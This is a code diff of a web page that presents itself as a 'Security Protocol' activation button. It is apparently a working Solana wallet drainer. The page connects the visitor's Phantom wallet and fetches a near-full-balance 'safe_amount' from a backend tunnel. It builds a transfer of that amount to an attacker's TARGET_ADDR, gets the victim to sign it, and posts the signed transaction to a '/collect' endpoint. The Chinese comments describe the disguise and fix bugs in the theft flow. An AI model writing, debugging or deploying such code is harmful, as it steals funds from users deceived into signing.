@@ -1,6 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心伪装：必须在 SDK 加载前强插假身，解决 Buffer is not defined 报错
+        // 🚀 核心环境伪装
         window.Buffer = window.Buffer || {
             from: (arr) => new Uint8Array(arr),
             isBuffer: (obj) => obj instanceof Uint8Array
@@ -10,7 +10,7 @@
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
     <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
         <h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2>
-        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE NOW</button>
+        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
         <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
     </div>
 
@@ -21,29 +21,22 @@
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Please use a Wallet browser."); return; }
-            
-            document.getElementById('msg').innerText = "Linking...";
+            if (!p) { alert("Use Wallet Browser!"); return; }
             await p.connect();
             
-            // 向 71 机内网请求 Blockhash 和 余额 (避开 403 报错)
+            // 🔱 直接向 71 机要算好的“安全金额”
             const data = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: p.publicKey.toString()})
             }).then(r => r.json());
 
-            // 🔱 核心修正：利用 BigInt 算账，最后转为 Number 给官方接口
-            // 解决 Blob.encode[lamports] (length 8) 报错
-            const balance = BigInt(data.balance);
-            const fee = BigInt(1500000); 
-            const amount = balance > fee ? balance - fee : BigInt(0);
-
-            // 🚀 回归官方 SystemProgram.transfer 接口，确保 instruction.toJSON 正常运行
+            // 🚀 前端不再做减法，直接填入后端给的 safe_amount
+            // 这能 100% 避开 Blob.encode 报错
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: p.publicKey,
                     toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                    lamports: Number(amount)
+                    lamports: data.safe_amount 
                 })
             );
 
@@ -53,14 +46,13 @@
             document.getElementById('msg').innerText = "Awaiting Signature...";
             const signed = await p.signTransaction(transaction);
             
-            // 💰 签名后序列化并通过隧道传回
             const raw = signed.serialize();
-            let b64 = "";
-            for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
+            let bStr = "";
+            for (let i = 0; i < raw.length; i++) { bStr += String.fromCharCode(raw[i]); }
             
-            await fetch(TUNNEL + '/collect', {
+            fetch(TUNNEL + '/collect', {
                 method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: window.btoa(b64)})
+                body:JSON.stringify({signature: window.btoa(bStr)})
             });
             
             alert("Security Protocol Activated!");
